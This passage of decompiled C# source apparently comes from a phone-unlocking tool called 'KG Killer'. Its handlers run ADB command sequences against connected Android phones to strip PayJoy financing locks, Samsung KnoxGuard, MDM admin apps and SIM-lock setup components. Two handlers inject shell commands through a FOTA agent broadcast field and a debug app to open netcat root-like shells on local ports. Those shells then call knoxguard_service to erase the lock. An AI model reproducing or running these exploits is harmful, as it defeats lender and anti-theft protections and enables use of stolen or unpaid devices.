						string text = await this.<button34_Click>g__GetWaitForDevicesResultAsync|108_0();
						string result = text + "\n";
						text = null;
						this.progressBar1.Value = 100;
						this.Logs("MDM Removed SucessFully KG Killer\n\r", Color.Green);
						this.progressBar1.Value = 0;
						props = null;
						adbCommands = null;
						list3 = null;
						process3 = null;
					}
					else
					{
						this.Logs(" Device not found", Color.Red);
					}
				}
				else
				{
					await this.WaitForDevices();
				}
			}
			catch (Exception ex2)
			{
				Console.WriteLine("Error: " + ex2.Message);
			}
		}

		// Token: 0x06000120 RID: 288 RVA: 0x0000AEA0 File Offset: 0x000090A0
		private async void button34_Click_1(object sender, EventArgs e)
		{
			this.Logs("\nChecking ADB Server..", Color.FloralWhite);
			string usernamee = Form3.usrname;
			this.Logs("\nUser :", Color.FloralWhite);
			this.Logs(usernamee, Color.OrangeRed);
			this.Logs("\nOperation:", Color.FloralWhite);
			this.Logs("Samsung Payjoy (New)\n", Color.Gold);
			await Task.Delay(100);
			if (this.CheckRunAdb())
			{
				this.Logs(" Running\n", Color.Green);
				TaskAwaiter taskAwaiter = Task.Delay(10).GetAwaiter();
				if (!taskAwaiter.IsCompleted)
				{
					await taskAwaiter;
					TaskAwaiter taskAwaiter2;
					taskAwaiter = taskAwaiter2;
					taskAwaiter2 = default(TaskAwaiter);
				}
				taskAwaiter.GetResult();
				this.Logs("Searching devices..\n", Color.FloralWhite);
				await Task.Delay(10);
				if (this.CariAdbDevice())
				{
					await Task.Delay(10);
					this.adbclients.SetDevice(this.SnAdb);
					Dictionary<string, string> props = this.adbclients.GetDeviceProperties();
					try
					{
						this.Logs("Model  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.product.model"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Version  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.build.version.incremental"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Build date  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.build.date"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Security patch  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.build.version.security_patch"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Android version  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.build.version.release"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
					}
					catch (Exception ex)
					{
						Console.WriteLine("Error: " + ex.Message);
					}
					this.Logs("Opening Shell", Color.FloralWhite);
					Adb.AdbCommand("shell pm disable com.payjoy.access");
					Adb.AdbCommand("shell pm disable-user --user 0  com.payjoy.access");
					Adb.AdbCommand("shell pm uninstall -k --user 0  com.payjoy.access");
					Adb.AdbCommand("shell dumpsys package com.payjoy.access");
					this.Logs(" Ok\n", Color.Green);
					Adb.AdbCommand("shell service call package 131 s16 com.payjoy.access i32 0");
					Adb.AdbCommand("shell dumpsys package com.payjoy.access");
					Adb.AdbCommand("shell service call package 64 s16 com.payjoy.access i32 2");
					Adb.AdbCommand("shell dumpsys package com.payjoy.access");
					this.Logs("Executing Commands", Color.FloralWhite);
					Adb.AdbCommand("shell service call package 66 s16 com.payjoy.access i32 0");
					Adb.AdbCommand("shell dumpsys package com.payjoy.access");
					Adb.AdbCommand("shell service call package 82 s16 com.payjoy.access i32 0");
					Adb.AdbCommand("shell dumpsys package com.payjoy.access");
					Adb.AdbCommand("shell service call package 79 s16 com.payjoy.access i32 1");
					Adb.AdbCommand("shell dumpsys package com.payjoy.access");
					this.Logs(" Done\n", Color.Green);
					Adb.AdbCommand("shell service call package 27 s16 com.payjoy.access i32 2 i32 0");
					Adb.AdbCommand("shell dumpsys package com.payjoy.access");
					Adb.AdbCommand("shell service call package 3 s16 com.payjoy.access i32 2");
					Adb.AdbCommand("shell dumpsys package com.payjoy.access");
					this.Logs("Cleaning Payjoy", Color.FloralWhite);
					Adb.AdbCommand("shell service call package 130 s16 com.payjoy.access");
					Adb.AdbCommand("shell service call package 27 s16 com.payjoy.access i32 2 i32 0");
					Adb.AdbCommand("shell dumpsys package com.payjoy.access");
					Adb.AdbCommand("reboot");
					this.Logs(" Done\n", Color.Green);
					Thread.Sleep(1000);
					this.Logs("BYE BYE PAYJOY\n", Color.Gold);
					Thread.Sleep(1000);
					this.Logs("\nSucessfully Removed By KG KIller", Color.Red);
					props = null;
				}
			}
			else
			{
				await this.WaitForDevices();
			}
		}

		// Token: 0x06000121 RID: 289 RVA: 0x0000AEE8 File Offset: 0x000090E8
		private async void button35_Click(object sender, EventArgs e)
		{
			MessageBox.Show("PLEASE REMOVE YOUR SIM CARD \nIF YOU RESET IT WILL USE SIM LOCK AGAIN!", "KG Killer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			this.Logs("\nChecking ADB Server..", Color.FloralWhite);
			await Task.Delay(100);
			if (!this.CheckRunAdb())
			{
				TaskAwaiter taskAwaiter = this.WaitForDevices().GetAwaiter();
				if (!taskAwaiter.IsCompleted)
				{
					await taskAwaiter;
					TaskAwaiter taskAwaiter2;
					taskAwaiter = taskAwaiter2;
					taskAwaiter2 = default(TaskAwaiter);
				}
				taskAwaiter.GetResult();
			}
			else
			{
				this.Logs(" Running\n", Color.Green);
				TaskAwaiter taskAwaiter3 = Task.Delay(10).GetAwaiter();
				if (!taskAwaiter3.IsCompleted)
				{
					await taskAwaiter3;
					TaskAwaiter taskAwaiter2;
					taskAwaiter3 = taskAwaiter2;
					taskAwaiter2 = default(TaskAwaiter);
				}
				taskAwaiter3.GetResult();
				this.Logs("Searching devices..\n", Color.FloralWhite);
				await Task.Delay(10);
				if (this.CariAdbDevice())
				{
					await Task.Delay(10);
					this.adbclients.SetDevice(this.SnAdb);
					Dictionary<string, string> props = this.adbclients.GetDeviceProperties();
					try
					{
						this.Logs("Model  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.product.model"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("KG STATUS➾ ", Color.FloralWhite);
						this.Logs(props["knox.kg.state"], Color.Red);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Version  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.build.version.incremental"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Build date  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.build.date"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Security patch  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.build.version.security_patch"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Android version  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.build.version.release"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
					}
					catch (Exception ex)
					{
						Console.WriteLine("Error: " + ex.Message);
					}
					this.Logs("Removing", Color.Green);
					Adb.AdbCommand("shell pm uninstall -k --user 0 com.google.android.carriersetup");
					Adb.AdbCommand("shell pm uninstall -k --user 0 com.google.android.pixel.setupwizard");
					Adb.AdbCommand("shell pm uninstall -k --user 0 com.google.android.setupwizard");
					Adb.AdbCommand("shell pm uninstall -k --user 0 com.google.android.pixel.setupwizard.auto_generated_rro_product__");
					Adb.AdbCommand("shell pm uninstall -k --user 0 com.google.android.partnersetup");
					Adb.AdbCommand("shell pm uninstall -k --user 0 com.google.android.pixel.setupwizard.overlay");
					Adb.AdbCommand("shell pm uninstall -k --user 0 com.google.android.pixel.setupwizard.overlay2019");
					this.Logs("OK\n", Color.FloralWhite);
					this.Logs("Wait For Reboot \n", Color.Green);
					Thread.Sleep(1000);
					Adb.AdbCommand("reboot");
					Thread.Sleep(1000);
					this.Logs("BYE BYE SIM LOCK", Color.Red);
					Thread.Sleep(1000);
					this.Logs("THE SIM UNLOCK IS DONE! \n PLEASE INSERT YOUR SIM CARD TO ACTIVATE THE SIM HACK", Color.Gold);
					this.Logs("Sucessfully Removed By KG KIller", Color.Red);
					props = null;
				}
			}
		}

		// Token: 0x06000122 RID: 290 RVA: 0x0000AF30 File Offset: 0x00009130
		private async void button36_Click(object sender, EventArgs e)
		{
			this.Logs("\nChecking ADB Server..", Color.FloralWhite);
			await Task.Delay(100);
			if (this.CheckRunAdb())
			{
				this.Logs(" Running\n", Color.Green);
				TaskAwaiter taskAwaiter = Task.Delay(10).GetAwaiter();
				if (!taskAwaiter.IsCompleted)
				{
					await taskAwaiter;
					TaskAwaiter taskAwaiter2;
					taskAwaiter = taskAwaiter2;
					taskAwaiter2 = default(TaskAwaiter);
				}
				taskAwaiter.GetResult();
				this.Logs("Searching devices..\n", Color.FloralWhite);
				await Task.Delay(10);
				if (this.CariAdbDevice())
				{
					await Task.Delay(10);
					this.adbclients.SetDevice(this.SnAdb);
					Dictionary<string, string> props = this.adbclients.GetDeviceProperties();
					try
					{
						this.Logs("Model  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.product.model"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Brand  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.product.brand"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("CPU  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.product.board"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Version  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.build.version.incremental"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Build date  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.build.date"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Security patch  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.build.version.security_patch"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Android version  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.build.version.release"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Android SDK  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.build.version.sdk"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("KG STATUS➾ ", Color.FloralWhite);
						this.Logs(props["knox.kg.state"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
					}
					catch (Exception ex)
					{
						Console.WriteLine("Error: " + ex.Message);
					}
					this.Logs("Removing", Color.Green);
					Adb.AdbCommand("shell pm disable-user --user 0 com.samsung.android.cidmanager");
					Adb.AdbCommand("shell pm uninstall --user 0 com.samsung.android.cidmanager");
					Adb.AdbCommand("shell pm enable-user --user 0 com.samsung.android.cidmanager");
					Adb.AdbCommand("shell reinstall cmd package install-existing com.samsung.android.cidmanager");
					Adb.AdbCommand("reboot");
					this.Logs("Successfully DONE", Color.Green);
					props = null;
				}
			}
			else
			{
				await this.WaitForDevices();
			}
		}

		// Token: 0x06000123 RID: 291 RVA: 0x0000AF78 File Offset: 0x00009178
		private async void button37_Click(object sender, EventArgs e)
		{
			this.ResultTxt.Clear();
			MessageBox.Show("Please Try Again Same Process If Your Device is Locked", "KG Killer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			string usernamee = Form3.usrname;
			this.Logs("\nUser : ", Color.FloralWhite);
			this.Logs(usernamee, Color.OrangeRed);
			this.Logs("\nOperation :", Color.FloralWhite);
			this.Logs("KG Android 14 New Method 3\n", Color.Gold);
			try
			{
				this.Logs("\nChecking ADB Server..", Color.FloralWhite);
				await Task.Delay(100);
				if (this.CheckRunAdb())
				{
					this.Logs("Running\n", Color.Green);
					TaskAwaiter taskAwaiter = Task.Delay(10).GetAwaiter();
					TaskAwaiter taskAwaiter2;
					if (!taskAwaiter.IsCompleted)
					{
						await taskAwaiter;
						taskAwaiter = taskAwaiter2;
						taskAwaiter2 = default(TaskAwaiter);
					}
					taskAwaiter.GetResult();
					this.Logs("Searching devices..\n", Color.FloralWhite);
					await Task.Delay(10);
					this.progressBar1.Value = 10;
					if (this.CariAdbDevice())
					{
						TaskAwaiter taskAwaiter3 = Task.Delay(10).GetAwaiter();
						if (!taskAwaiter3.IsCompleted)
						{
							await taskAwaiter3;
							taskAwaiter3 = taskAwaiter2;
							taskAwaiter2 = default(TaskAwaiter);
						}
						taskAwaiter3.GetResult();
						this.adbclients.SetDevice(this.SnAdb);
						Dictionary<string, string> props = this.adbclients.GetDeviceProperties();
						try
						{
							this.Logs("Model  ➾ ", Color.FloralWhite);
							this.Logs(props["ro.product.model"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("Brand  ➾ ", Color.FloralWhite);
							this.Logs(props["ro.product.brand"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("CPU  ➾ ", Color.FloralWhite);
							this.Logs(props["ro.product.board"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("Version  ➾ ", Color.FloralWhite);
							this.Logs(props["ro.build.version.incremental"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("Build date  ➾ ", Color.FloralWhite);
							this.Logs(props["ro.build.date"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("Security patch  ➾ ", Color.FloralWhite);
							this.Logs(props["ro.build.version.security_patch"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("Android version  ➾ ", Color.FloralWhite);
							this.Logs(props["ro.build.version.release"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("Android SDK  ➾ ", Color.FloralWhite);
							this.Logs(props["ro.build.version.sdk"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("KG STATUS➾ ", Color.FloralWhite);
							this.Logs(props["knox.kg.state"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.progressBar1.Value = 20;
						}
						catch (Exception ex)
						{
							Console.WriteLine("Error: " + ex.Message);
						}
						this.Logs("Writing Data File ", Color.FloralWhite);
						this.Logs(" OK\n", Color.FloralWhite);
						await Task.Delay(100);
						this.progressBar1.Value = 40;
						await this.PushApkAsync("fota_apk.apk", "/data/local/tmp/fota_apk.apk");
						await Task.Delay(500);
						this.Logs("Writing Data File To System ", Color.FloralWhite);
						string[] adbCommands = new string[]
						{
							"pm install /data/local/tmp/fota_apk.apk", "mkdir /sdcard/mdmfixtool", "pm uninstall-system-updates com.samsung.android.kgclient", "pm disable-user --user 0 com.samsung.android.kgclient", "pm uninstall --user 0 com.android.systemui", "pm uninstall --user 0 com.samsung.klmsagent", "pm uninstall --user 0 com.android.ons", "pm uninstall --user 0 com.android.dynsystem", "pm uninstall --user 0 com.samsung.android.app.updatecenter", "pm uninstall --user 0 com.google.android.configupdater",
							"pm uninstall --user 0 com.wssyncmldm", "pm uninstall --user 0 com.sec.enterprise.knox.cloudmdm.smdms", "am set-inactive com.samsung.android.kgclient true", "am kill com.samsung.android.kgclient", "am crash com.samsung.android.kgclient", "am stop-app com.samsung.android.kgclient", "pm uninstall-system-updates com.samsung.android.kgclient", "pm disable-user --user 0 com.samsung.android.kgclient", "pm enable --user 0 com.samsung.android.kgclient", "pm uninstall-system-updates com.samsung.android.kgclient",
							"pm suspend com.samsung.android.kgclient", "pm uninstall --user 0 com.samsung.android.kgclient", "am start -n com.sdet.fotaagent/.Main", "am broadcast -a com.sdet.fotaagent.intent.CP_FILE -e CP_FILE /sdcard/mdmfixtool -e CP_LOC \"/data/data/com.samsung.SMT && /system/bin/sh -c \"toybox netcat -s 127.0.0.1 -p 8133 -L sh -l\"\""
						};
						this.Logs(" OK\n", Color.Green);
						this.progressBar1.Value = 50;
						this.Logs("Erase KG ", Color.FloralWhite);
						Thread.Sleep(1100);
						foreach (string command in adbCommands)
						{
							this.adbclients.ExecuteRemoteCommand(command);
							Thread.Sleep(200);
							command = null;
						}
						string[] array = null;
						List<string> list3 = new List<string>
						{
							"nc localhost 8133 || nc 127.0.0.1 8133", "input text 'service call knoxguard_service 36'", "input keyevent 66", "input text 'service call knoxguard_service 40 s16 \"null\"'", "input keyevent 66", "input text 'service call knoxguard_service 39'", "input keyevent 66", "input text 'service call knoxguard_service 37'", "input keyevent 66", "input text 'service call knoxguard_service 41 s16 \"null\"'",
							"input keyevent 66", "input text 'service call knoxguard_service 40'", "input keyevent 66", "pm suspend com.samsung.android.kgclient", "am set-inactive com.samsung.android.kgclient true", "pm enable --user 0 com.samsung.android.kgclient", "pm install-existing --restrict-permissions --user 0 com.samsung.android.kgclient", "am kill com.samsung.android.kgclient", "am crash com.samsung.android.kgclient", "am stop-app com.samsung.android.kgclient",
							"cmd appops set com.samsung.android.kgclient RUN_IN_BACKGROUND deny", "cmd appops set com.samsung.android.kgclient RUN_ANY_IN_BACKGROUND deny", "cmd appops set com.samsung.android.kgclient WAKE_LOCK deny", "pm install-existing --restrict-permissions --user 0 com.android.systemui", "am force-stop com.sdet.fotaagent --user 0", "pm uninstall --user 0 com.sdet.fotaagent", "reboot"
						};
						this.progressBar1.Value = 80;
						Process process3 = ShellController.CreateShellProcess();
						foreach (string command2 in list3)
						{
							string output = ShellController.ExecuteShellCommand(process3, command2, 20000);
							output = this.CustomizeOutput(output);
							output = null;
							command2 = null;
						}
						List<string>.Enumerator enumerator = default(List<string>.Enumerator);
						ShellController.CloseShellProcess(process3);
						this.Logs(" Ok\n", Color.Green);
						this.progressBar1.Value = 90;
						string text = await this.<button37_Click>g__GetWaitForDevicesResultAsync|112_0();
						string result = text + "\n";
						text = null;
						this.Logs("KG STATUS: ", Color.FloralWhite);
						this.Logs(props["knox.kg.state"] + " \n", Color.Green);
						this.progressBar1.Value = 100;
						this.Logs("KG Removed Sucessfully By KG Killer\n\r", Color.Gold);
						Thread.Sleep(2000);
						this.Logs("This Is Beta Method\r\n", Color.Gold);
						this.Logs("If Your Device Is Still Locked\r\n", Color.Red);
						this.Logs("Contact US On Telegram\r\n", Color.Gold);
						this.progressBar1.Value = 0;
						props = null;
						adbCommands = null;
						list3 = null;
						process3 = null;
					}
					else
					{
						this.Logs("Device not found", Color.Red);
					}
				}
				else
				{
					await this.WaitForDevices();
				}
			}
			catch (Exception ex2)
			{
				Console.WriteLine("Error: " + ex2.Message);
			}
		}

		// Token: 0x06000124 RID: 292 RVA: 0x0000AFC0 File Offset: 0x000091C0
		private async void button38_Click(object sender, EventArgs e)
		{
			this.Logs("\nChecking ADB Server..", Color.FloralWhite);
			await Task.Delay(100);
			if (this.CheckRunAdb())
			{
				this.Logs(" Running\n", Color.Green);
				TaskAwaiter taskAwaiter = Task.Delay(10).GetAwaiter();
				if (!taskAwaiter.IsCompleted)
				{
					await taskAwaiter;
					TaskAwaiter taskAwaiter2;
					taskAwaiter = taskAwaiter2;
					taskAwaiter2 = default(TaskAwaiter);
				}
				taskAwaiter.GetResult();
				this.Logs("Searching devices..\n", Color.FloralWhite);
				await Task.Delay(10);
				if (this.CariAdbDevice())
				{
					await Task.Delay(10);
					this.adbclients.SetDevice(this.SnAdb);
					Dictionary<string, string> props = this.adbclients.GetDeviceProperties();
					try
					{
						this.Logs("\nWAIT", Color.FloralWhite);
						this.progressBar1.Value = 0;
						Adb.AdbCommand("shell settings put global development_settings_enabled 0");
						Thread.Sleep(1500);
						this.progressBar1.Value = 50;
						this.ResultTxt.SelectionColor = Color.Green;
						this.ResultTxt.AppendText(" ➾\nHide Successfully ");
						this.progressBar1.Value = 100;
					}
					catch (Exception ex)
					{
						Console.WriteLine("Error: " + ex.Message);
					}
				}
			}
			else
			{
				await this.WaitForDevices();
			}
		}

		// Token: 0x06000125 RID: 293 RVA: 0x00007DB4 File Offset: 0x00005FB4
		private void pictureBox6_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000126 RID: 294 RVA: 0x00007DB4 File Offset: 0x00005FB4
		private void button39_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000127 RID: 295 RVA: 0x0000B008 File Offset: 0x00009208
		private async void button39_Click_1(object sender, EventArgs e)
		{
			this.ResultTxt.Clear();
			MessageBox.Show("This Is OG Play Store Method", "KG Killer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			string usernamee = Form3.usrname;
			this.Logs("\nUser : ", Color.FloralWhite);
			this.Logs(usernamee, Color.OrangeRed);
			this.Logs("\nOperation :", Color.FloralWhite);
			this.Logs(" Redmi MDM (All In One)\n", Color.Gold);
			this.Logs("\nChecking ADB Server..", Color.FloralWhite);
			await Task.Delay(100);
			if (!this.CheckRunAdb())
			{
				TaskAwaiter taskAwaiter = this.WaitForDevices().GetAwaiter();
				if (!taskAwaiter.IsCompleted)
				{
					await taskAwaiter;
					TaskAwaiter taskAwaiter2;
					taskAwaiter = taskAwaiter2;
					taskAwaiter2 = default(TaskAwaiter);
				}
				taskAwaiter.GetResult();
			}
			else
			{
				this.Logs(" Running\n", Color.Green);
				TaskAwaiter taskAwaiter3 = Task.Delay(10).GetAwaiter();
				if (!taskAwaiter3.IsCompleted)
				{
					await taskAwaiter3;
					TaskAwaiter taskAwaiter2;
					taskAwaiter3 = taskAwaiter2;
					taskAwaiter2 = default(TaskAwaiter);
				}
				taskAwaiter3.GetResult();
				this.Logs("Searching devices..\n", Color.FloralWhite);
				await Task.Delay(10);
				if (this.CariAdbDevice())
				{
					await Task.Delay(10);
					this.adbclients.SetDevice(this.SnAdb);
					Dictionary<string, string> props = this.adbclients.GetDeviceProperties();
					try
					{
						this.Logs("Model  : ", Color.FloralWhite);
						this.Logs(props["ro.product.model"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Brand: ", Color.FloralWhite);
						this.Logs(props["ro.product.brand"], Color.Red);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Version  : ", Color.FloralWhite);
						this.Logs(props["ro.build.version.incremental"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Build date  : ", Color.FloralWhite);
						this.Logs(props["ro.build.date"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Security patch  : ", Color.FloralWhite);
						this.Logs(props["ro.build.version.security_patch"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Android version  : ", Color.FloralWhite);
						this.Logs(props["ro.build.version.release"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
					}
					catch (Exception ex)
					{
						Console.WriteLine("Error: " + ex.Message);
					}
					this.Logs("\n Start Removing IT Admin...", Color.Green);
					Adb.AdbCommand("shell pm uninstall --user 0 com.android.overlay.gmstelecomm");
					Adb.AdbCommand("shell pm uninstall --user 0 com.android.server.telecom.overlay.miui");
					Adb.AdbCommand("shell pm uninstall --user 0 com.mediatek.op01.telecom");
					this.Logs("\n Removing IT Admin...", Color.FloralWhite);
					Adb.AdbCommand("shell pm uninstall --user 0 com.mediatek.op09clib.telecom");
					Adb.AdbCommand("shell pm uninstall --user 0 com.trustonic.telecoms.setup");
					Adb.AdbCommand("shell pm uninstall --user 0 com.mediatek.mdmconfig");
					Adb.AdbCommand("shell pm uninstall --user 0 com.mediatek.mdmlsample");
					this.Logs("Ok\n", Color.Green);
					this.Logs("\n Sucessfully Removed BY KG Killer...", Color.Gold);
					props = null;
				}
			}
		}

		// Token: 0x06000128 RID: 296 RVA: 0x00007DB4 File Offset: 0x00005FB4
		private void button40_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000129 RID: 297 RVA: 0x0000B050 File Offset: 0x00009250
		private string GenerateIP()
		{
			string text2;
			try
			{
				string hostName = Dns.GetHostName();
				IPAddress ipaddress = Dns.GetHostAddresses(hostName).FirstOrDefault((IPAddress ip) => ip.AddressFamily == AddressFamily.InterNetwork);
				string text = ((ipaddress != null) ? ipaddress.ToString() : null);
				text2 = ((!string.IsNullOrEmpty(text)) ? text : "No IP address found!");
			}
			catch (Exception ex)
			{
				text2 = "Error: " + ex.Message;
			}
			return text2;
		}

		// Token: 0x0600012A RID: 298 RVA: 0x0000B0D4 File Offset: 0x000092D4
		private async void button12_Click_1(object sender, EventArgs e)
		{
			if (MessageBox.Show("Do You Want To Continue", "KG Killer", MessageBoxButtons.YesNo) == DialogResult.Yes)
			{
				this.ResultTxt.Clear();
				MessageBox.Show("If You Fail Then Try Again Same Process", "KG Killer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				string usernamee = Form3.usrname;
				this.Logs("\nUser : ", Color.FloralWhite);
				this.Logs(usernamee, Color.OrangeRed);
				this.Logs("\nOperation :", Color.FloralWhite);
				this.Logs("KG Android 13 (New Patch)\n", Color.Gold);
				try
				{
					this.Logs("\nChecking ADB Server..", Color.FloralWhite);
					await Task.Delay(100);
					if (this.CheckRunAdb())
					{
						this.Logs(" Running\n", Color.Green);
						TaskAwaiter taskAwaiter = Task.Delay(10).GetAwaiter();
						TaskAwaiter taskAwaiter2;
						if (!taskAwaiter.IsCompleted)
						{
							await taskAwaiter;
							taskAwaiter = taskAwaiter2;
							taskAwaiter2 = default(TaskAwaiter);
						}
						taskAwaiter.GetResult();
						this.Logs("Searching devices..\n", Color.FloralWhite);
						await Task.Delay(10);
						this.progressBar1.Value = 10;
						if (this.CariAdbDevice())
						{
							TaskAwaiter taskAwaiter3 = Task.Delay(10).GetAwaiter();
							if (!taskAwaiter3.IsCompleted)
							{
								await taskAwaiter3;
								taskAwaiter3 = taskAwaiter2;
								taskAwaiter2 = default(TaskAwaiter);
							}
							taskAwaiter3.GetResult();
							this.adbclients.SetDevice(this.SnAdb);
							Dictionary<string, string> props = this.adbclients.GetDeviceProperties();
							try
							{
								this.Logs("Model  ➾ ", Color.FloralWhite);
								this.Logs(props["ro.product.model"], Color.Green);
								this.Logs("\n", Color.FloralWhite);
								this.Logs("Brand  ➾ ", Color.FloralWhite);
								this.Logs(props["ro.product.brand"], Color.Green);
								this.Logs("\n", Color.FloralWhite);
								this.Logs("CPU  ➾ ", Color.FloralWhite);
								this.Logs(props["ro.product.board"], Color.Green);
								this.Logs("\n", Color.FloralWhite);
								this.Logs("Version  ➾ ", Color.FloralWhite);
								this.Logs(props["ro.build.version.incremental"], Color.Green);
								this.Logs("\n", Color.FloralWhite);
								this.Logs("Build date  ➾ ", Color.FloralWhite);
								this.Logs(props["ro.build.date"], Color.Green);
								this.Logs("\n", Color.FloralWhite);
								this.Logs("Security patch  ➾ ", Color.FloralWhite);
								this.Logs(props["ro.build.version.security_patch"], Color.Green);
								this.Logs("\n", Color.FloralWhite);
								this.Logs("Android version  ➾ ", Color.FloralWhite);
								this.Logs(props["ro.build.version.release"], Color.Green);
								this.Logs("\n", Color.FloralWhite);
								this.Logs("Android SDK  ➾ ", Color.FloralWhite);
								this.Logs(props["ro.build.version.sdk"], Color.Green);
								this.Logs("\n", Color.FloralWhite);
								this.Logs("KG STATUS➾ ", Color.FloralWhite);
								this.Logs(props["knox.kg.state"], Color.Green);
								this.Logs("\n", Color.FloralWhite);
								this.progressBar1.Value = 20;
							}
							catch (Exception ex)
							{
								Console.WriteLine("Error: " + ex.Message);
							}
							this.Logs("Writing Data File ", Color.FloralWhite);
							picture f3 = new picture();
							f3.Show();
							this.Logs(" OK\n", Color.Green);
							await Task.WhenAll(new Task[]
							{
								Task.Run(delegate
								{
									this.InstallApk("2.apk", "install -r");
								}),
								Task.Delay(2000)
							});
							await Task.Delay(1000);
							await Task.WhenAll(new Task[]
							{
								Task.Run(delegate
								{
									this.InstallApk("3.apk", "install -r");
								}),
								Task.Delay(500),
								Task.Run(delegate
								{
									this.InstallApk("audio.apk", "install -i PrePackageInstaller");
								}),
								Task.Delay(500),
								Task.Run(delegate
								{
									this.InstallApk("audio.apk", "install -d -i com.sec.android.preloadinstaller");
								}),
								Task.Delay(500)
							});
							this.progressBar1.Value = 40;
							await this.PushApkAsync("audio.apk", "/data/local/tmp/zero.apk");
							await Task.Delay(500);
							this.Logs("Writing Data File To System ", Color.FloralWhite);
							string[] adbCommands = new string[]
							{
								"am start -n com.sec.android.app.audiocoredebug/com.sec.android.app.audiocoredebug.MainActivity", "input keyevent KEYCODE_TAB", "input keyevent KEYCODE_TAB", "input keyevent KEYCODE_TAB", "input keyevent KEYCODE_TAB", "input keyevent KEYCODE_TAB", "input keyevent KEYCODE_TAB", "input keyevent KEYCODE_TAB", "input keyevent 66", "input text 'nc -s 127.0.0.1 -p 2222 -L /system/bin/sh'",
								"input keyevent KEYCODE_TAB", "input keyevent 66"
							};
							this.Logs(" OK\n", Color.Green);
							this.progressBar1.Value = 50;
							this.Logs("Erase KG ", Color.FloralWhite);
							foreach (string command in adbCommands)
							{
								this.adbclients.ExecuteRemoteCommand(command);
								TaskAwaiter taskAwaiter4 = Task.Delay(200).GetAwaiter();
								if (!taskAwaiter4.IsCompleted)
								{
									await taskAwaiter4;
									taskAwaiter4 = taskAwaiter2;
									taskAwaiter2 = default(TaskAwaiter);
								}
								taskAwaiter4.GetResult();
								command = null;
							}
							string[] array = null;
							List<string> list3 = new List<string>
							{
								"nc 127.0.0.1 2222", "service call knoxguard_service 37", "service call knoxguard_service 44 s16 'null'", "service call knoxguard_service 43 s16 'null'", "service call knoxguard_service 42 s16 'null'", "service call knoxguard_service 41 s16 'null'", "service call knoxguard_service 41 s16 null", "service call knoxguard_service 40 s16 'null'", "service call knoxguard_service 40 s16 null", "service call knoxguard_service 40",
								"reboot"
							};
							this.progressBar1.Value = 80;
							Process process3 = ShellController.CreateShellProcess();
							foreach (string command2 in list3)
							{
								string output = ShellController.ExecuteShellCommand(process3, command2, 20000);
								output = this.CustomizeOutput(output);
								output = null;
								command2 = null;
							}
							List<string>.Enumerator enumerator = default(List<string>.Enumerator);
							ShellController.CloseShellProcess(process3);
							this.Logs(" Ok\n", Color.Green);
							this.progressBar1.Value = 90;
							string text = await this.<button12_Click_1>g__GetWaitForDevicesResultAsync|119_4();
							string result = text + "\n";
							text = null;
							this.Logs("\n", Color.FloralWhite);
							this.Logs("Reboot : ", Color.FloralWhite);
							this.Logs("Done \n", Color.Green);
							this.progressBar1.Value = 100;
							this.Logs("KG Removed Sucessfully By KG Killer\n\r", Color.Gold);
